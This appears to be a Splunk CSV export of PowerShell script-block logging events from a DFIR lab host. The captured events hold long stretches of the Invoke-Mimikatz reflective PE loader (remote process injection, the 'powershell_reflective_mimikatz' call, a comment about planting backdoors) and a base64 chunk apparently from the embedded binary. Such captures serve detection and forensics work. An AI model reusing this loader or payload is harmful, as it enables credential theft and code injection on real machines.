@@ -1,0 +1,1719 @@
+AssemblyBuilder,Attributes,CallDllMainSC1,CallDllMainSC2,CallDllMainSC3,CategoryString,ComputerName,ConstructorInfo,DebugPreference,DefaultParameterSetName,DllCharacteristicsType,DllMain,DllMainDelegate,DllMainPtr,Domain,DynamicAssembly,EventCode,EventType,ExeArgs,ExeDoneBytePtr,ExeMainPtr,"IMAGE_DATA_DIRECTORY","IMAGE_FILE_HEADER","Image_File_Name",ImportDescriptor,ImportDescriptorPtr,ImportDllHandle,ImportDllPath,KEAohCiGKIgoiiiMKI4okCiSKJQogAAAAAAAAAAAAA,Keywords,LogName,MachineType,MagicType,Mandatory,Message,ModuleBuilder,NumBytesWritten,OpCode,Output,OutputPtr,OverwrittenMemInfo,PEBytes,PEBytes64,PEHandle,PEInfo,PELoadedInfo,ParameterSetName,Position,ProcId,ProcInfo,Processes,Processor,Processors,RSCAddr,RThreadHandle,RecordNumber,RemotePEHandle,RemoteProcHandle,RemoteScriptBlock,Result,SCLength,SCPSMem,SCPSMemOriginal,Sid,SidType,SourceName,SubSystemType,Success,TaskCategory,ThreadDone,Type,TypeBuilder,User,VoidFuncAddr,WStringFunc,WStringFuncAddr,WStringFuncDelegate,WStringInput,Win32Constants,Win32Functions,Win32Types,"_raw","_time",action,app,category,curpid,dvc,"dvc_nt_host",enterprise,"event_id",eventtype,host,id,index,jwt,linecount,linkid,name,"parent_process",process,"process_name",props,punct,reg,res,"response_content_disposition","response_content_type",result,rscd,rsct,se,service,"service_id","service_name",severity,"severity_id",sig,signature,"signature_id",ske,skoid,sks,skt,sktid,skv,source,sourcetype,sp,"splunk_server","splunk_server_group",spr,sr,subject,sv,tag,"tag::app","tag::eventtype",threatid,title,url,"user_group_id","user_id","vendor_product",wshell
+,,,,,,"DESKTOP-78CU07R",,,,,"[System.Runtime.InteropServices.Marshal]","Get-DelegateType","Add-SignedIntAsUnsigned",,,4104,3,,,"Add-SignedIntAsUnsigned",,,,"[System.Runtime.InteropServices.Marshal]","Add-SignedIntAsUnsigned","$Win32Functions.GetModuleHandle.Invoke($ImportDllPath)","[System.Runtime.InteropServices.Marshal]",,None,"Microsoft-Windows-PowerShell/Operational",,,"$true",Splunk,,,On,"[System.Runtime.InteropServices.Marshal]","$WStringFunc.Invoke($WStringInput)",,"[Byte[]]",,"[IntPtr]","Get-PEDetailedInfo","Invoke-MemoryLoadLibrary",,0,"$Processes[0].ID","Get-Process | where { $_.Name -eq $ProcName } | Select-Object ProcessName","@(Get-Process -Name $ProcName -ErrorAction SilentlyContinue)","$Processors[0]","Get-WmiObject",,,596,"$PELoadedInfo[1]","[IntPtr]",,,,,,"S-1-5-21-1697325460-2044954953-441488130-1001",0,"Microsoft-Windows-PowerShell",,"$Win32Functions.FreeLibrary.Invoke($ImportDllHandle)",Execute,"[System.Runtime.InteropServices.Marshal]",Warning,,"NOT_TRANSLATED","Get-MemoryProcAddress","[System.Runtime.InteropServices.Marshal]","Get-MemoryProcAddress","Get-DelegateType","[System.Runtime.InteropServices.Marshal]","Get-Win32Constants","Get-Win32Functions","Get-Win32Types","11/23/2025 08:39:14.656 AM
+LogName=Microsoft-Windows-PowerShell/Operational
+EventCode=4104
+EventType=3
+ComputerName=DESKTOP-78CU07R
+User=NOT_TRANSLATED
+Sid=S-1-5-21-1697325460-2044954953-441488130-1001
+SidType=0
+SourceName=Microsoft-Windows-PowerShell
+Type=Warning
+RecordNumber=596
+Keywords=None
+TaskCategory=Execute a Remote Command
+OpCode=On create calls
+Message=Splunk could not get the description for this event. Either the component that raises this event is not installed on your local computer or the installation is corrupt.
+
+FormatMessage error:
+
+Got the following information from this event: 
+
+unction to instead ExitThread
+			#	This way the reflectively loaded EXE won't kill the powershell process when it exits, it will just kill its own thread.
+			[IntPtr]$ExeMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
+			Write-Verbose ""Call EXE Main function. Address: $ExeMainPtr. Creating thread for the EXE to run in.""
+
+			$Win32Functions.CreateThread.Invoke([IntPtr]::Zero, [IntPtr]::Zero, $ExeMainPtr, [IntPtr]::Zero, ([UInt32]0), [Ref]([UInt32]0)) | Out-Null
+
+			while($true)
+			{
+				[Byte]$ThreadDone = [System.Runtime.InteropServices.Marshal]::ReadByte($ExeDoneBytePtr, 0)
+				if ($ThreadDone -eq 1)
+				{
+					Copy-ArrayOfMemAddresses -CopyInfo $OverwrittenMemInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants
+					Write-Verbose ""EXE thread has completed.""
+					break
+				}
+				else
+				{
+					Start-Sleep -Seconds 1
+				}
+			}
+		}
+		
+		return @($PEInfo.PEHandle, $EffectivePEHandle)
+	}
+	
+	
+	Function Invoke-MemoryFreeLibrary
+	{
+		Param(
+		[Parameter(Position=0, Mandatory=$true)]
+		[IntPtr]
+		$PEHandle
+		)
+		
+		#Get Win32 constants and functions
+		$Win32Constants = Get-Win32Constants
+		$Win32Functions = Get-Win32Functions
+		$Win32Types = Get-Win32Types
+		
+		$PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
+		
+		#Call FreeLibrary for all the imports of the DLL
+		if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0)
+		{
+			[IntPtr]$ImportDescriptorPtr = Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)
+			
+			while ($true)
+			{
+				$ImportDescriptor = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ImportDescriptorPtr, [Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR)
+				
+				#If the structure is null, it signals that this is the end of the array
+				if ($ImportDescriptor.Characteristics -eq 0 `
+						-and $ImportDescriptor.FirstThunk -eq 0 `
+						-and $ImportDescriptor.ForwarderChain -eq 0 `
+						-and $ImportDescriptor.Name -eq 0 `
+						-and $ImportDescriptor.TimeDateStamp -eq 0)
+				{
+					Write-Verbose ""Done unloading the libraries needed by the PE""
+					break
+				}
+
+				$ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi((Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$ImportDescriptor.Name)))
+				$ImportDllHandle = $Win32Functions.GetModuleHandle.Invoke($ImportDllPath)
+
+				if ($ImportDllHandle -eq $null)
+				{
+					Write-Warning ""Error getting DLL handle in MemoryFreeLibrary, DLLName: $ImportDllPath. Continuing anyways"" -WarningAction Continue
+				}
+				
+				$Success = $Win32Functions.FreeLibrary.Invoke($ImportDllHandle)
+				if ($Success -eq $false)
+				{
+					Write-Warning ""Unable to free library: $ImportDllPath. Continuing anyways."" -WarningAction Continue
+				}
+				
+				$ImportDescriptorPtr = Add-SignedIntAsUnsigned ($ImportDescriptorPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR))
+			}
+		}
+		
+		#Call DllMain with process detach
+		Write-Verbose ""Calling dllmain so the DLL knows it is being unloaded""
+		$DllMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
+		$DllMainDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr]) ([Bool])
+		$DllMain = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DllMainPtr, $DllMainDelegate)
+		
+		$DllMain.Invoke($PEInfo.PEHandle, 0, [IntPtr]::Zero) | Out-Null
+		
+		
+		$Success = $Win32Functions.VirtualFree.Invoke($PEHandle, [UInt64]0, $Win32Constants.MEM_RELEASE)
+		if ($Success -eq $false)
+		{
+			Write-Warning ""Unable to call VirtualFree on the PE's memory. Continuing anyways."" -WarningAction Continue
+		}
+	}
+
+
+	Function Main
+	{
+		$Win32Functions = Get-Win32Functions
+		$Win32Types = Get-Win32Types
+		$Win32Constants =  Get-Win32Constants
+		
+		$RemoteProcHandle = [IntPtr]::Zero
+	
+		#If a remote process to inject in to is specified, get a handle to it
+		if (($ProcId -ne $null) -and ($ProcId -ne 0) -and ($ProcName -ne $null) -and ($ProcName -ne """"))
+		{
+			Throw ""Can't supply a ProcId and ProcName, choose one or the other""
+		}
+		elseif ($ProcName -ne $null -and $ProcName -ne """")
+		{
+			$Processes = @(Get-Process -Name $ProcName -ErrorAction SilentlyContinue)
+			if ($Processes.Count -eq 0)
+			{
+				Throw ""Can't find process $ProcName""
+			}
+			elseif ($Processes.Count -gt 1)
+			{
+				$ProcInfo = Get-Process | where { $_.Name -eq $ProcName } | Select-Object ProcessName, Id, SessionId
+				Write-Output $ProcInfo
+				Throw ""More than one instance of $ProcName found, please specify the process ID to inject in to.""
+			}
+			else
+			{
+				$ProcId = $Processes[0].ID
+			}
+		}
+		
+		#Just realized that PowerShell launches with SeDebugPrivilege for some reason.. So this isn't needed. Keeping it around just incase it is needed in the future.
+		#If the script isn't running in the same Windows logon session as the target, get SeDebugPrivilege
+#		if ((Get-Process -Id $PID).SessionId -ne (Get-Process -Id $ProcId).SessionId)
+#		{
+#			Write-Verbose ""Getting SeDebugPrivilege""
+#			Enable-SeDebugPrivilege -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants
+#		}	
+		
+		if (($ProcId -ne $null) -and ($ProcId -ne 0))
+		{
+			$RemoteProcHandle = $Win32Functions.OpenProcess.Invoke(0x001F0FFF, $false, $ProcId)
+			if ($RemoteProcHandle -eq [IntPtr]::Zero)
+			{
+				Throw ""Couldn't obtain the handle for process ID: $ProcId""
+			}
+			
+			Write-Verbose ""Got the handle for the remote process to inject in to""
+		}
+		
+
+		#Load the PE reflectively
+		Write-Verbose ""Calling Invoke-MemoryLoadLibrary""
+
+        try
+        {
+            $Processors = Get-WmiObject -Class Win32_Processor
+        }
+        catch
+        {
+            throw ($_.Exception)
+        }
+
+        if ($Processors -is [array])
+        {
+            $Processor = $Processors[0]
+        } else {
+            $Processor = $Processors
+        }
+
+        if ( ( $Processor.AddressWidth) -ne (([System.IntPtr]::Size)*8) )
+        {
+            Write-Verbose ( ""Architecture: "" + $Processor.AddressWidth + "" Process: "" + ([System.IntPtr]::Size * 8))
+            Write-Error ""PowerShell architecture (32bit/64bit) doesn't match OS architecture. 64bit PS must be used on a 64bit OS."" -ErrorAction Stop
+        }
+
+        #Determine whether or not to use 32bit or 64bit bytes
+        if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 8)
+        {
+            [Byte[]]$PEBytes = [Byte[]][Convert]::FromBase64String($PEBytes64)
+        }
+        else
+        {
+            [Byte[]]$PEBytes = [Byte[]][Convert]::FromBase64String($PEBytes32)
+        }
+        $PEBytes[0] = 0
+        $PEBytes[1] = 0
+		$PEHandle = [IntPtr]::Zero
+		if ($RemoteProcHandle -eq [IntPtr]::Zero)
+		{
+			$PELoadedInfo = Invoke-MemoryLoadLibrary -PEBytes $PEBytes -ExeArgs $ExeArgs
+		}
+		else
+		{
+			$PELoadedInfo = Invoke-MemoryLoadLibrary -PEBytes $PEBytes -ExeArgs $ExeArgs -RemoteProcHandle $RemoteProcHandle
+		}
+		if ($PELoadedInfo -eq [IntPtr]::Zero)
+		{
+			Throw ""Unable to load PE, handle returned is NULL""
+		}
+		
+		$PEHandle = $PELoadedInfo[0]
+		$RemotePEHandle = $PELoadedInfo[1] #only matters if you loaded in to a remote process
+		
+		
+		#Check if EXE or DLL. If EXE, the entry point was already called and we can now return. If DLL, call user function.
+		$PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
+		if (($PEInfo.FileType -ieq ""DLL"") -and ($RemoteProcHandle -eq [IntPtr]::Zero))
+		{
+			#########################################
+			### YOUR CODE GOES HERE
+			#########################################
+                    Write-Verbose ""Calling function with WString return type""
+				    [IntPtr]$WStringFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName ""powershell_reflective_mimikatz""
+				    if ($WStringFuncAddr -eq [IntPtr]::Zero)
+				    {
+					    Throw ""Couldn't find function address.""
+				    }
+				    $WStringFuncDelegate = Get-DelegateType @([IntPtr]) ([IntPtr])
+				    $WStringFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WStringFuncAddr, $WStringFuncDelegate)
+                    $WStringInput = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($ExeArgs)
+				    [IntPtr]$OutputPtr = $WStringFunc.Invoke($WStringInput)
+                    [System.Runtime.InteropServices.Marshal]::FreeHGlobal($WStringInput)
+				    if ($OutputPtr -eq [IntPtr]::Zero)
+				    {
+				    	Throw ""Unable to get output, Output Ptr is NULL""
+				    }
+				    else
+				    {
+				        $Output = [System.Runtime.InteropServices.Marshal]::PtrToStringUni($OutputPtr)
+				        Write-Output $Output
+				        $Win32Functions.LocalFree.Invoke($OutputPtr);
+				    }
+			#########################################
+			### END OF YOUR CODE
+			#########################################
+		}
+		#For remote DLL injection, call a void function which takes no parameters
+		elseif (($PEInfo.FileType -ieq ""DLL"") -and ($RemoteProcHandle -ne [IntPtr]::Zero))
+		{
+			$VoidFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName ""VoidFunc""
+			if (($VoidFuncAddr -eq $null) -or ($VoidFuncAddr -eq [IntPtr]::Zero))
+			{
+				Throw ""VoidFunc couldn't be found in the DLL""
+			}
+			
+			$VoidFuncAddr = Sub-SignedIntAsUnsigned $VoidFuncAddr $PEHandle
+			$VoidFuncAddr = Add-SignedIntAsUnsigned $VoidFuncAddr $RemotePEHandle
+			
+			#Create the remote thread, don't wait for it to return.. This will probably mainly be used to plant backdoors
+			$RThreadHandle = Invoke-CreateRemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $VoidFuncAddr -Win32Functions $Win32Functions
+		}
+		
+		#Don't free a library if it is injected in a remote process
+		if ($RemoteProcHandle -eq [IntPtr]::Zero)
+		{
+			Invoke-MemoryFreeLibrary -PEHandle $PEHandle
+		}
+		else
+		{
+			#Just delete the memory allocated in PowerShell to build the PE before injecting to remote process
+			$Success = $Win32Functions.VirtualFree.Invoke($PEHandle, [UInt64]0, $Win32Constants.MEM_RELEASE)
+			if ($Success -eq $false)
+			{
+				Write-Warning ""Unable to call VirtualFree on the PE's memory. Continuing anyways."" -WarningAction Continue
+			}
+		}
+		
+		Write-Verbose ""Done!""
+	}
+
+	Main
+}
+8a275253-2ef8-49ec-81bc-f0732490f5a8","2025-11-23T14:39:14.656+0000",,,Execute,,"DESKTOP-78CU07R","DESKTOP-78CU07R",,596,"endpoint_services_processes windows_event_signature windows_ta_data","DESKTOP-78CU07R",596,"mydfir-project",,292,,,,,,,"//_::._=--/===-==-------==--====___=__=________.__",,,,,,,,,,,,medium,3,,,4104,,,,,,,"Microsoft-Windows-PowerShell/Operational",WinEventLog,,"chalitha-splunk",,,,,,"track_event_signatures",,"track_event_signatures",,,,,,"Microsoft Windows",
+,,,,,,"DESKTOP-78CU07R",,,,,,,,,,4104,3,,,,,,,,,,,,None,"Microsoft-Windows-PowerShell/Operational",,,,Splunk,,,On,,,,,,,,,,,,,,,,,,505,,,,,,,,"S-1-5-21-1697325460-2044954953-441488130-1001",0,"Microsoft-Windows-PowerShell",,,Execute,,Warning,,"NOT_TRANSLATED",,,,,,,,,"11/23/2025 08:39:14.630 AM
+LogName=Microsoft-Windows-PowerShell/Operational
+EventCode=4104
+EventType=3
+ComputerName=DESKTOP-78CU07R
+User=NOT_TRANSLATED
+Sid=S-1-5-21-1697325460-2044954953-441488130-1001
+SidType=0
+SourceName=Microsoft-Windows-PowerShell
+Type=Warning
+RecordNumber=505
+Keywords=None
+TaskCategory=Execute a Remote Command
+OpCode=On create calls
+Message=Splunk could not get the description for this event. Either the component that raises this event is not installed on your local computer or the installation is corrupt.
+
+FormatMessage error:
+
+Got the following information from this event: 
+
+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PigAKEIoRChGKEgoSihOKFAoUihUKFYoWChaKFwoYihmKGgoaihsKG4oYCjiKOQo5ijoKOoo7CjuKPAo8ij0KPYo+Cj6KPwo/ijAKQIpBCkGKQgpCikMKQ4pECkSKRQpFikYKRopHCkeKSApIikkKSYpKCkqKSwpLikwKTIpNCk4KTopPCk+KQApQilEKUYpSClKKUwpTilQKVIpVClWKVgpWilcKV4pYCliKWQpZiloKWopbCluKXApcil0KXYpeCl6KXwpfilAKYIphCmGKYgpiimMKY4pgCqCKoQqhiqIKooqjCqOKpAqkiqUKpYqmCqaKpwqniqgKqIqpCqmKoAAAAACwDAAAAA8Kn4qQCqCKqIqpiqqKq4qsiq2KroqviqCKsYqyirOKtIq1iraKt4q4irmKuoq7iryKvYq+ir+KsIrBisKKw4rEisWKxorHisiKyYrKisuKzIrNis6Kz4rAitGK0orTitSK1YrWiteK2IrZitqK24rcit2K3orfitCK4YriiuOK5IrliuaK54roiumK6orriuyK7Yruiu+K4IrxivKK84r0ivWK9or3iviK+Yr6ivuK/Ir9iv6K/4rwAQCwAgAQAACKAYoCigOKBIoFigaKB4oIigmKCooLigyKDYoOig+KAIoRihKKE4oUihWKFooXihiKGYoaihuKHIodih6KH4oQiiGKIoojiiSKJYomiieKKIopiiqKK4osii2KLooviiCKMYoyijOKNIo1ijaKN4o4ijmKOoo7ijyKPYo+ij+KMIpBikKKQ4pEikWKRopHikiKSYpKikuKTIpNik6KT4pAilGKUopTilSKVYpWileKWIpZilqKW4pcil2KXopfilCKYYpiimOKZIplimaKZ4poimmKaoprimyKbYpuim+KYIpxinKKc4p0inWKdop3iniKeYp6inuKfIp9in6Kf4pwioGKgoqDioSKhYqGioeKiIqJioqKi4qAAgCwBsAQAA4KTwpAClEKUgpTClQKVQpWClcKWApZCloKWwpcCl0KXgpfClAKYQpiCmMKZAplCmYKZwpoCmkKagprCmwKbQpuCm8KYApxCnIKcwp0CnUKdgp3CngKeQp6CnsKfAp9Cn4KfwpwCoEKggqDCoQKhQqGCocKiAqJCooKiwqMCo0KjgqPCoAKkQqSCpMKlAqVCpYKlwqYCpkKmgqbCpwKnQqeCp8KkAqhCqIKowqkCqUKpgqnCqgKqQqqCqsKrAqtCq4KrwqgCrEKsgqzCrQKtQq2CrcKuAq5CroKuwq8Cr0Kvgq/CrAKwQrCCsMKxArFCsYKxwrICskKygrLCswKzQrOCs8KwArRCtIK0wrUCtUK1grXCtgK2QraCtsK3ArdCt4K3wrQCuEK4grjCuQK5QrmCucK6ArpCuoK6wrsCu0K7grvCuAK8QryCvMK9Ar1CvYK9wr4CvkK+gr7CvwK/Qr+Cv8K8AMAsAbAAAAACgEKAgoDCgQKBQoGCgcKCAoJCgoKCwoMCg0KDgoPCgAKEQoSChMKFAoVChYKFwoYChkKGgobChwKHQoeCh8KEAohCiIKIwokCiUKJgonCigKKQoqCisKLAotCi4KLwogCjEKMAUAsASAAAACioMKi4rsiu2K7orviuCK8QrxivIK8orzCvOK9Ar0ivUK9Yr2CvaK9wr3ivgK+Ir5CvoK+wr8Cv0K/gr/CvAAAAYAsA/AEAAACgEKAgoDCgQKBQoGCgcKCAoJCgoKCwoMCg0KDgoPCgAKEQoSChMKFAoVChYKFwoYChkKGgobChwKHQoeCh8KEAohCiIKIwokCiUKJgoniiiKK4osCiyKLQotii4KLoovCi+KIAowijEKMYoyCjKKMwozijQKNIo1CjWKNgo3CjgKOQo6CjsKPAo9CjYKRopHCkeKSApIikkKSYpKCkqKSwpLikQKVQpWClcKWApZCloKWwpcCl0KXgpfClAKYQpiCmMKZAplCmYKZopnCmeKaApoimkKaYpqCmqKawprimwKbIptCm2Kbgpuim8Kb4pgCnCKcQpxinIKcwp0CnUKdgp3CngKeQp6CnsKfAp9Cn4KfwpwCoEKggqDCoQKhQqGCocKiAqJCooKiwqMCo0KjgqPCoAKkQqSCpMKlAqVCpYKlwqYCpkKmgqbCpwKnQqeCp8KkAqhCqIKowqkCqUKpgqnCqgKqQqqCqsKrAqtCq4KrwqgCrEKsgqzCrQKtQq2CrcKuAq5CroKuwq8Cr0Kvgq/CrAKwQrCCsMKxArFCsYKxwrICskKywrLiswKzIrNCs4KzorPCs+KwArQitEK0YrSCtKK0wrTitQK1IrWiteK2IraCt8K74rgCvCK8wr6ivsK+4r8Cv0K/Yr+Cv6K/wr/ivAHALAJAAAAAAoAigEKAYoCCgKKAwoDigQKBIoGCgeKCQoKigwKDYoPCgCKEgoTihUKFooYChmKGwocih4KH4oRCiKKI4osCiyKLQotii4KLoovCi+KIgoyijMKM4o2CjuKOgpKiksKTApOCkaKUgpiimMKY4pmCmuKbwqACpCKkQqRipQKkAqgiqEKoYqkCqAIALAAABAACQpZiloKWopdClgKagprCmuKbAptCm8Kawp7inwKfIp9Cn2Kfgp+in8Kf4pwCoCKgQqBioIKgoqDCoOKhQqFioYKhoqJComKigqKiosKi4qMCoyKjQqNio4KjoqPCo+KgAqQipEKkYqSCpKKkwqTipYKnYqeCp6Knwq/irAKwIrBCsKKxArFiscKyIrKCsuKzQrOisAK0YrTCtOK1ArUitUK1YrWCtaK1wrXitgK2IrZitoK2orbCtuK3Arcit0K3YreCt6K3wrfitCK4QrhiuIK4orjCuOK5IrlCuWK5groCuiK6QrpiuoK6orrCuuK7Arsiu0K4AAACQCwBsAAAAaKdwp3ingKeIp5CnOKhAqEioUKhYqJiooKioqLCoCKkQqhiqIKooqjCqSKpQqliqYKpoqnCqeKqAqoiqkKqYqqCqyKrQqqitsK24rcCtyK3Qrdit4K3orfCt+K0AriiuMK4AAACgCwAcAAAAWKFoobCsuKzArMis0KzYrOCsAAAAsAsAaAEAAACnCKcQpxinIKcopzCnAKgIqBCoGKggqCioMKhwqniqgKqIqpCqmKqgqqiqsKq4qsCqyKrQqtiq4KroqvCq+KoAqwirEKsYqyCrKKtIq1CrWKtgq2ircKt4q4CriKuQq5iroKuoq7CruKvAq8ir0KvYq+Cr6Kvwq/irAKwQrCCsKKwwrDisSKxQrFisYKxorHCseKyArIiskKyYrKCsqKywrLiswKzIrNCs2KzgrOis8Kz4rACtCK0QrRitIK0orTCtOK1ArUitUK1YrWCtaK1wrXitgK2IrZCtmK2graitsK24rcit0K3orfCt+K0ArgiuEK4YriCuKK4wrjiuQK5IrlCuWK5grmiucK54roCuiK6QrpiuoK6orrCuuK7Arsiu0K7grgivEK8orzCvOK9Ar0ivUK9Yr2CvaK9wr3ivgK+Ir5CvmK+gr6ivsK+4r8CvyK/Qr9iv4K/or/Cv+K8AwAsABAMAAACgCKAQoBigIKAooDCgOKBAoEigUKBooHCgeKCAoIigkKDgoOig8KD4oDChOKFAoUihUKFYoWChaKFwoXihgKGIoZChmKGgoaihsKHIoeCh6KHwofihAKIIohCiGKIgoiiiMKI4okCiSKJQoliiYKJoonCieKKAooiikKKYoq